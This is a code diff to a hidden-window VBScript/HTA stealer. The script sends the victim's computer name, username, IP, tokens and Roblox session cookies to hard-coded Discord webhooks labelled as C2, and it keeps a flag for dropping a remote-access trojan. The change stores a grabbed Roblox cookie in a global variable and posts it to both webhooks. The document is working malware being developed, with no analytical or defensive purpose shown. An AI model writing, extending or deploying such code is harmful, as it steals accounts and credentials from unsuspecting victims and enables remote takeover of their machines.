@@ -6,7 +6,7 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, RE_WH, PC, USER, ratDropped
+Dim sh, fso, WH, RE_WH, PC, USER, ratDropped, globalCookie
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
@@ -16,6 +16,7 @@ RE_WH = "https://discord.com/api/webhooks/1573947886775963800/UfMWoHoVFLXsPx1m4f
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 ratDropped = False
+globalCookie = ""
 
 ' --- 1. INITIAL GRABS (to C2 WH) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
@@ -35,8 +36,11 @@ Do
     Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
+    
+    ' Sends cookie to RE_WH
     Call PostCookieOnly(RE_WH)
-    Call PostCookieOnly(WH) ' <--- ADDED THIS LINE
+    ' Sends cookie to WH
+    Call PostCookieOnly(WH)
     
     ' Only download RAT if it hasn't dropped successfully yet
     If Not ratDropped Then
@@ -119,7 +123,8 @@ End Sub
 
 ' --- PostCookieOnly ---
 Sub PostCookieOnly(targetWH)
-    Dim cookie : cookie = GetRobloxCookie()
+    Dim cookie : cookie = globalCookie
+    If Len(cookie) = 0 Then cookie = GetRobloxCookie()
     If Len(cookie) = 0 Then Exit Sub
     Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
 End Sub
@@ -248,6 +253,7 @@ Sub GrabTokens(targetWH)
                 End If
                 If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
                     Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 10181046, targetWH)
+                    globalCookie = Mid(l, 8) ' <--- STORES COOKIE GLOBALLY
                 End If
             End If
         Next
